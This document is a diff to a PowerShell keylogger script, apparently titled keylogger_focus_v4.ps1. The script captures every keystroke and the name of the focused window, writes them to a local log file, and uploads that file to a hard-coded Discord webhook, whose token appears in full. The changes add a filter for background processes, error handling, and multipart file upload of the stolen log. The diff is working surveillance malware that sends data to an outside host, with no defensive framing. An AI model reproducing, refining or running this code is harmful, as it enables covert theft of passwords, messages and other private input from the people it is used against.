@@ -1,4 +1,3 @@
-# Save this as keylogger_focus_v4.ps1
 # Define the log file and Discord webhook URL
 $logFile = "C:\key_log.txt"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1281143685895159809/FnbUZFSOnixzoac78xUQuXJ7qve5OoH1jZ8ejA7zDPUbqb1LX-7ltk0adeRzUYq0H0Un"
@@ -28,20 +27,37 @@ Add-Type @"
     }
 "@
 
-# Function to get the currently focused process name or app
+# Function to get the currently focused process name or app, with filtering of background processes
 function Get-FocusedApp {
     $handle = [FocusHelper]::GetForegroundWindow()
     $windowTitle = New-Object System.Text.StringBuilder 256
     [void] [FocusHelper]::GetWindowText($handle, $windowTitle, $windowTitle.Capacity)
 
-    # If the title is empty, try to get the process name
+    # List of processes to ignore (common background processes)
+    $ignoredProcesses = @(
+        "Idle", "System", "svchost", "dwm", "csrss", "conhost", "ctfmon", 
+        "winlogon", "sihost", "services", "smss", "fontdrvhost", "audiodg",
+        "explorer", "WmiPrvSE", "WUDFHost", "MsMpEng", "RuntimeBroker", 
+        "spoolsv", "Registry"
+    )
+
+    # If the window title is empty, check the process associated with the window handle
     if ($windowTitle.ToString() -eq "") {
         $focusedProcess = Get-Process | Where-Object { $_.MainWindowHandle -eq $handle }
         if ($focusedProcess) {
-            return $focusedProcess.Name
+            # Ignore known background/system processes
+            if ($focusedProcess.Name -notin $ignoredProcesses) {
+                return $focusedProcess.Name
+            }
         }
     }
-    return $windowTitle.ToString()
+    
+    # Return the window title if it exists and isn't a background process
+    if ($windowTitle.ToString() -ne "" -and $windowTitle.ToString() -notin $ignoredProcesses) {
+        return $windowTitle.ToString()
+    }
+
+    return $null  # Return null for ignored apps and background processes
 }
 
 # Function to write keystrokes to the log file with spaces between each character
@@ -56,20 +72,38 @@ function Log-Activity {
     param([string]$message)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $entry = "$timestamp - $message"
-    Add-Content -Path $logFile -Value $entry
+    
+    # Write the entry to the log file
+    try {
+        Add-Content -Path $logFile -Value $entry
+    } catch {
+        Write-Host "Error writing to log file: $_"
+    }
 }
 
-# Function to send the log file to Discord
+# Function to send the log file to Discord as an attachment
 function Send-LogToDiscord {
     try {
-        # Prepare the log content
-        $logContent = Get-Content $logFile -Raw
-        $payload = @{
-            content = "`n``n" + $logContent
+        # Prepare the log file as a file attachment
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $headers = @{
+            "Content-Type" = "multipart/form-data; boundary=`"$boundary`""
         }
 
-        # Send the content to Discord
-        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json)
+        $fileContent = [IO.File]::ReadAllBytes($logFile)
+        $fileBase64 = [Convert]::ToBase64String($fileContent)
+        
+        $body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="key_log.txt"
+Content-Type: text/plain
+
+$(Get-Content -Path $logFile -Raw)
+--$boundary--
+"@
+
+        # Send the file to Discord
+        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Headers $headers -Body $body
     } catch {
         Write-Host "Error sending log file to Discord: $_"
     }
@@ -91,7 +125,7 @@ function Log-FocusedApp {
     $focusedApp = Get-FocusedApp
     
     # Check if the focused window has changed
-    if ($global:currentFocusedApp -ne $focusedApp) {
+    if ($global:currentFocusedApp -ne $focusedApp -and $focusedApp -ne $null) {
         # Log the previous app's keystrokes if any exist
         if ($keystrokeBuffer -ne "") {
             Log-Activity "[KEYSTROKES]: $keystrokeBuffer"
@@ -141,4 +175,3 @@ while ($true) {
         $startTime = Get-Date
     }
 }
-
